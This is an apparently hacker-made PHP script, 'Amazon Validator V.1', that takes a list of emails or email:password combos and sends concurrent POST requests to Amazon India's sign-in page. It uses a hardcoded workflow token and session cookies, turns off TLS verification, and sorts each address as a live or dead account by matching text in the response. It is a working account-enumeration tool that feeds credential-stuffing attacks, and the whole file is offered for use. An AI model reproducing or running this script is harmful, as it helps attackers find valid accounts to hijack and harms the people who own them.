<?php
ini_set("memory_limit", '-1');
date_default_timezone_set('Asia/Jakarta');
define("OS", strtolower(PHP_OS));
banner();

menu:
echo color()["RED"]."Choose Your Validator : \n";
echo color()["GR"]."\n";
echo color()["GR"]." - [ 1 ]. Amazon Validator\n";
echo color()["YL"]."\n * [ Selection ]	: ";
$menu = trim(fgets(STDIN));
if ($menu== "1"){
require_once "RollingCurl/RollingCurl.php";
require_once "RollingCurl/Request.php";

enterlist:
$listname = readline(" * [ Enter Your List ]	:  ");
if(empty($listname) || !file_exists($listname)) {
	echo"[?] list not found".PHP_EOL;
	goto enterlist;
}
else if($listname == "n") {
	echo "[?] list not found".PHP_EOL;
	goto enterlist;
}
$lists = array_unique(explode("\n", str_replace("\r", "", file_get_contents($listname))));
$savedir = readline(" * [ Save Results ]	:     ");
$dir = empty($savedir) ? "results" : $savedir;
if(!is_dir($dir)) mkdir($dir);
chdir($dir);
reqemail:
$reqemail = readline(" * [ Ratio Check / S ]  : ");
echo color()["RED"]."----------------------------------------------------------------------------------\n";
echo color()["YL"]."                                   [ Process ] \n";
echo PHP_EOL;
$reqemail = (empty($reqemail) || !is_numeric($reqemail) || $reqemail <= 1) ? 4 : $reqemail;
if($reqemail > 1000) {
	echo "[!] max 1000".PHP_EOL;
	goto reqemail;
}
else if($reqemail == "1") {
	echo "[!] Minimail 2".PHP_EOL;
	goto reqemail;
}
$no = 0;
$total = count($lists);
$live = 0;
$die = 0;
$unknown = 0;
$c = 0;
$rollingCurl = new \RollingCurl\RollingCurl();
foreach($lists as $list) {
	$c++;
	if(strpos($list, "|") !== false) list($email, $pwd) = explode("|", $list);
	else if(strpos($list, ":") !== false) list($email, $pwd) = explode(":", $list);
	else $email = $list;
	if(empty($email)) continue;
	$email = str_replace(" ", "", $email);
	$data = 'workflowState=eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.EBVSkuA2Lyi0Hqu5joMDYeyOenywVkLo7U64kMBLImxYcQKnVdiyqw.YMN4QosMYwWecCPG.bOffBkIeHLI9OMLL9roJa3qW2U_pKpAJ3atcibUWhq3CAHmrWmktybywiWsFIXifOdKH0VbO6OIuCmEGc8Q-c0lK8bZChTisDP7dfr5Ljl8QN7x-TcrxJqi04wfYoGfyBDNoVuEdazZCGYKHvDV3fMHX9T4jbkE-TsPwwshkeXNnsPqQDXRmtaiNk3ihhy9s_dQ-Wq1wV383-Gd4rCEXHNOw3ivk0SmcpPvAbWRPBXkx3WUhhhjrQZP39lOssCqkv41W7MENXRY5lhCFpotb9Fb1vbfab39nqKA3hatiGveEpbR5HUygT8XcUiveLPf8HD2oN91WPJQ.fhgbuVQc-tffe5NLAija9g&email='.$email.'&password=&';
    $headers = array();
	$headers[] = 'Authority: www.amazon.in';
	$headers[] = 'Host: www.amazon.in';
	$headers[] = 'Origin: https://www.amazon.in';
	$headers[] = 'Content-Type: application/x-www-form-urlencoded';
	$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Mobile Safari/537.36';
	$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3';
	$headers[] = 'Referer: https://www.amazon.in/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3Fref_%3Dnav_ya_signin%26_encoding%3DUTF8&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=inflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&';
	$headers[] = 'Cookie: session-id=261-5629419-4947305; i18n-prefs=INR; ubid-acbin=257-5090710-3599800; session-id-time=2082758401l; session-token=\"uURDvMhMigphZN4+90iMyzmNwYK+UXgWkGn9qXnFghPmP7PMJlUVFHyN+Oa4Mo8XULm/MIu2TxKITbASKLBvS4kY2xCr1JhddOxl8Lwtm6q7n5S0mQmIuPPmeDUV/0DGSeGMSxpMZiOR0m6h64EqLNeisVJl379Opmbx5h71TAy0NEZC9HX0DhSD2KBrXsDru12ogRLvAZQ6CLl2s0980w==\"; csm-hit=TZ1ZP0DA0PCXT6SDVWHZ+b-2K93TC8TSKQ59Y78WRS1|1566387192294';
	$rollingCurl->setOptions(array(CURLOPT_RETURNTRANSFER => 1, CURLOPT_ENCODING => "gzip", CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4))->post("https://www.amazon.in/ap/signin?jembot=$email", $data, $headers);
}
$rollingCurl->setCallback(function(\RollingCurl\Request $request, \RollingCurl\RollingCurl $rollingCurl) use (&$results) {
	global $listname, $dir, $no, $total, $live, $die, $unknown;
	$no++;
	parse_str(parse_url($request->getUrl(), PHP_URL_QUERY), $params);
	$email = $params["jembot"];
	$x = $request->getResponseText();
	echo color()["BL"]." - [".$no."/".$total."]-[".date("H:i:s")."]";
	if (inStr($x, 'There was a problem')) {
	$die++;
		file_put_contents("die.txt", $email.PHP_EOL, FILE_APPEND);
		echo color()["RED"]." DIE".color()["RED"]." => ".$email;
	}else  if (inStr($x, 'Enter your email')) {
	$live++;
		file_put_contents("live.txt", $email.PHP_EOL, FILE_APPEND);
		echo color()["GR"]." LIVE".color()["GR"]." => ".$email;
	} else {
	$unknown++;
		file_put_contents("UKNOWN.txt", $email.PHP_EOL, FILE_APPEND);
		echo color()["PUR"]." UNKNOWN".color()["PUR"]." => ".$email;
	}
	
    echo "";
    
    echo PHP_EOL;
})->setSimultaneousLimit((int) $reqemail)->execute();
system('clear');
echo PHP_EOL."-- Checking Done --\n-- Total: ".$total." - Live: ".$live." - Die: ".$die." - Unknown: ".$unknown." Saved to dir \"".$dir."\" -- \n".PHP_EOL;
}
else if ($menu== "2"){
echo "Coomingsoon\n" ;
}
else if (empty($menu)){
    echo color()["RED"]."[x] ".color()["WH"]."Perintah Tidak Boleh Kosong";
   	goto menu;
	}
else{
	echo color()["RED"]."[x] ".color()["WH"]."Perintah Tidak Dikenali";
	goto menu;
	}
function banner(){
	    
	echo color()["RED"]."---------------------------------------------------------------------------------\n";
	echo color()["GRB"]."                               [ Amazon Validator V.1 ] \n";
	echo color()["RED"]."---------------------------------------------------------------------------------\n";
	echo color()["GRB"]." \n";
	echo color()["GR"]."                       Work As Hard As You Can Until You Succeed\n";
	echo color()["YL"]."             Until One Day Your Neighbors Think It Is The Result Of Stealing\n";
		echo color()["GRB"]." \n";
	echo color()["RED"].strtoupper(date('---------------------------- [ d M 2020 | h:i ] ----------------------------'));
	echo color()["WH"]."\n";
    echo color()["WH"]."\n";
    }    

function color() {
	return array(
		"WH" => "\e[0;37m",
		"YL" => "\e[1;33m",
		"RED" => "\e[1;31m",
		"PUR" => "\e[0;35m",
		"CY" => "\e[0;36m",
		"GR" => "\e[1;32m",
		"GRB" => "\e[0;32m",
		"BL" => "\e[1;34m",
		
	);
}
function getStr($source, $start, $end) {
    $a = explode($start, $source);
    $b = explode($end, $a[0]);
    return $b[0];
}
function inStr($s, $as){
    $s = strtoupper($s);
    if(!is_array($as)) $as=array($as);
    for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true;
    return false;
    }

